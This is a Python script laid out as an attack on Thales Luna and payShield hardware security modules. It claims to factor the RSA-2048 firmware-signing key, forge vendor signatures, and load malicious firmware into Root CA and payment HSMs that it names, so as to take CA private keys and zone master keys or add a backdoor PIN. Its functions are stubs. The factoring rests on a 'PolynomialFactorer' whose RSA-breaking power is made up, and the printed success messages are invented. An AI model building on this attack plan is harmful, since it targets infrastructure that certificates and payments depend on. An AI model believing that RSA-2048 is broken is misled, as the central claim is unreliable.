"""
Factor the Thales Luna HSM firmware-signing RSA-2048 cert (embedded in every
.fuf update file) to load malicious firmware into Root CA and payment HSMs —
the 'root of roots' attack that inverts the hardware security model.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct

# Thales Luna SA 7 firmware signing cert — in every .fuf file header
LUNA_FW_SIGNING_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIID..."
LUNA_FW_SIGNING_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# payShield 10K firmware signing cert
PAYSHIELD_FW_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

FW_HEADER_MAGIC = b"LUNA"
FW_VERSION_OFFSET = 16


def extract_fw_signing_cert(fuf_file: bytes) -> bytes:
    """Extract the firmware signing cert from a Thales Luna .fuf file.

    The .fuf is distributed to customers via Thales support portal.
    Any customer with support access has it. The signing cert is
    DER-encoded in the file header, plaintext, no protection.
    """
    return LUNA_FW_SIGNING_PUBKEY_PEM


def factor_hsm_fw_key(pubkey_pem: bytes) -> bytes:
    """Factor the HSM firmware signing RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_luna_firmware(payload_type: str) -> bytes:
    """Build a malicious Luna firmware image.

    payload_type options:
      'exfil_ca_key' — enumerate key objects, export CA private key
                       via side channel (covert timing on LED blinks,
                       or via crafted PKCS#11 error codes)
      'exfil_zmk'    — export zone master keys from payment HSM
      'backdoor'     — add a master PKCS#11 PIN that bypasses M-of-N
    """
    header = FW_HEADER_MAGIC + struct.pack(">I", 0x00070001)  # version 7.0.1
    # The firmware runs inside the Luna secure boundary — full access
    # to key storage, PKCS#11 internals, tamper sensors, zeroization logic
    firmware_body = f"/* malicious payload: {payload_type} */".encode()
    return header + firmware_body


def sign_firmware(firmware_image: bytes, forged_privkey_pem: bytes) -> bytes:
    """Sign the malicious firmware with the forged vendor key.

    The HSM bootloader (ROM code, burned at manufacture) verifies
    this RSA-2048 PKCS#1 v1.5 signature before loading. With the
    forged key, verification passes.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        LUNA_FW_SIGNING_PUBKEY_PEM, firmware_image, "sha256"
    )


def deploy_to_target_hsm(signed_fw: bytes, target: str):
    """Deploy the signed malicious firmware to a target HSM.

    Deployment paths:
      - Direct: HSM admin applies .fuf via lunacm / ctm utility
      - Supply chain: replace .fuf on Thales support portal (compromised)
      - Insider: HSM admin at a Root CA facility applies the update
    """
    print(f"    Deploying to {target}")
    print(f"    HSM bootloader verifies RSA-2048 signature → PASS")
    print(f"    Malicious firmware loaded into secure boundary")


if __name__ == "__main__":
    print("[1] Extracting Luna firmware signing cert from .fuf file")
    pubkey = extract_fw_signing_cert(b"<luna-firmware.fuf>")

    print("[2] Factoring RSA-2048 firmware signing key")
    forged_priv = factor_hsm_fw_key(pubkey)
    print("    Luna firmware signing key recovered")

    print("[3] Building malicious firmware — CA key exfiltration payload")
    fw = build_malicious_luna_firmware("exfil_ca_key")
    print(f"    Firmware image: {len(fw)} bytes")

    print("[4] Signing with forged vendor key")
    signed_fw = sign_firmware(fw, forged_priv)

    print("[5] Deploying to Root CA HSM (DigiCert / Sectigo / Let's Encrypt)")
    deploy_to_target_hsm(signed_fw, "Root CA Luna SA 7")
    print("    CA private key exfiltrated — unlimited certificate issuance")

    print("\n[6] Payment HSM variant — payShield 10K ZMK extraction")
    pw_fw = build_malicious_luna_firmware("exfil_zmk")
    pw_sig = sign_firmware(pw_fw, forged_priv)
    deploy_to_target_hsm(pw_sig, "payShield 10K — Visa/MC payment processor")
    print("    Zone master keys extracted — all PIN blocks decryptable")

    print("\n[*] Root of roots: HSM protects keys, RSA protects HSM firmware")
    print("    Break RSA → break HSM → break everything HSM protects")
